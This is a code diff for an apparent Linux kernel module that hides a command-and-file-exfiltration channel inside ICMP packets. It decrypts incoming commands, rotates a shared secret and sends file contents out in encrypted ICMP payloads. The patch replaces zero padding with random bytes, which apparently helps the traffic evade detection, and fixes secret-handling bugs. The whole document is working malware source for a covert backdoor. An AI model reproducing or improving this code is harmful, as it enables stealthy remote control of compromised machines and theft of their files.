@@ -1868,8 +1868,8 @@ enum {
 static int __update_secret_succ(void)
 {
 	if (secret_state == SECRET_SEND) {
-		memcpy(secret_buf, secret_new, LEN_PREFIX_CMD);
-		memset(secret_new, 0, LEN_PREFIX_CMD);
+		memcpy(secret_buf, secret_new, LEN_SECRET);
+		memset(secret_new, 0, LEN_SECRET);
 		secret_state = SECRET_OK;
 	}
 	return 0;
@@ -1904,7 +1904,7 @@ static int enc_buf(char *dst, char *src, int len)
 	return ret;
 }
 
-static int dec_buf(char *dst, char *src, int len)
+static int dec_buf(char *dst, char *src, char *orig_src, int len)
 {
 	short cmd = 0;
 	int succ = -1;
@@ -1919,10 +1919,12 @@ static int dec_buf(char *dst, char *src, int len)
 		cmd = ntohs(*(short*)dst);
 		if (cmd > 0 && cmd < MAX_NUM_CMD) {
 			succ = 0;
+			__update_secret_succ();
 			goto end;
 		}
 	}
 
+	memcpy(src, orig_src, len);
 	ret = enc_dec_buf(dst, src, len, CMD_DECRYPT, secret_buf, sizeof(secret_buf));
 	if (ret < 0)
 		goto end;
@@ -1931,9 +1933,6 @@ static int dec_buf(char *dst, char *src, int len)
 		succ = 0;
 
 end:
-	if (succ == 0)
-		__update_secret_succ();
-
 	mutex_unlock(&mutex_tfm);
 	return succ;
 }
@@ -2054,6 +2053,29 @@ static int icmp_ratelimit(struct net_ratelimit_state *rs, int len)
         return ret;
 }
 
+static int random_buf(char *buf, int len)
+{
+	unsigned int random;
+	int ret = -1;
+	int i = 0;
+	int cnt = 0;
+	
+	if (!buf || len <= 0)
+		goto end;
+
+	random = get_random_int();
+	cnt = len / sizeof(random);
+	for (i=0; i<cnt; i++)
+		*(((unsigned int*)buf)+i) = random;
+
+	cnt = len % sizeof(random);
+	if (cnt > 0)
+		memcpy(buf + i*sizeof(random), (char*)&random, cnt);
+	ret = len;
+end:
+	return ret;
+}
+
 static int send_file_data(const char *fname, int f_len, struct sk_buff *skb, char *data, loff_t file_size)
 {
 	struct sk_buff *skb2 = NULL;
@@ -2111,7 +2133,7 @@ static int send_file_data(const char *fname, int f_len, struct sk_buff *skb, cha
 		ptr += len;
 
 		if (cmd + (skb2->len-sizeof(struct timeval))  - ptr > 0)
-			memset(ptr, 0, cmd + (skb2->len-sizeof(struct timeval)) - ptr);
+			random_buf(ptr, cmd + (skb2->len-sizeof(struct timeval)) - ptr);
 
 		enc_buf(cmd, cmd, skb2->len - sizeof(struct timeval));
 
@@ -2159,6 +2181,7 @@ static int kthread_send_file(void *data)
 
 	kfree(sf_st);
 	atomic_dec(&num_kthread);
+	do_exit(0);
 	return 0;
 }
 
@@ -2245,8 +2268,10 @@ static int do_send_file_size(const char *name, int f_len, struct sk_buff *skb, c
 		goto end;
 
 	*(int*)buf = htonl(sizeof(int));
-	file_size = htonl(file_size);
 	memcpy(buf+sizeof(int), (void*)&file_size, sizeof(file_size));
+
+	if (buf_len - sizeof(file_size) - sizeof(int) > 0)
+		random_buf(buf + sizeof(int) + sizeof(file_size), buf_len - sizeof(file_size) - sizeof(int));
 
 	ptr = buf - 1 - f_len - LEN_PREFIX_CMD;
 	enc_buf(ptr, ptr, buf_len + 1 + f_len + LEN_PREFIX_CMD);
@@ -2333,6 +2358,10 @@ static int do_secret_task(struct sk_buff *skb)
 	*(int *)(p_cmd+LEN_PREFIX_CMD) = htonl(LEN_SECRET);
 	memcpy(p_cmd+LEN_PREFIX_CMD+sizeof(int), new_sec, LEN_SECRET);
 
+	if (len - LEN_SECRET - sizeof(int) > 0)
+		random_buf(p_cmd + LEN_PREFIX_CMD + sizeof(int) + LEN_SECRET,
+				len - LEN_SECRET - sizeof(int));
+
 	enc_buf(p_cmd, p_cmd, LEN_SECRET + sizeof(int) + LEN_PREFIX_CMD);
 	secret_state = SECRET_SEND;
 
@@ -2344,6 +2373,7 @@ end:
 }
 
 /*
+ *                             net byteorder                    net byteorder
  *   | icmphdr | + | timeval | + | CMD | + | filename | + '\0' + | data_len | + | data |
  *       |              |        2 bytes                 1 bytes   4 bytes
  * sizeof(icmphdr)      |       
@@ -2372,7 +2402,7 @@ static int do_exec_event(struct sk_buff *skb)
 		goto end;
 	memcpy(orig_data, data, len);
 
-	if (dec_buf(data, data, len) < 0) {
+	if (dec_buf(data, data, orig_data, len) < 0) {
 		memcpy(data, orig_data, len);
 		goto end;
 	}
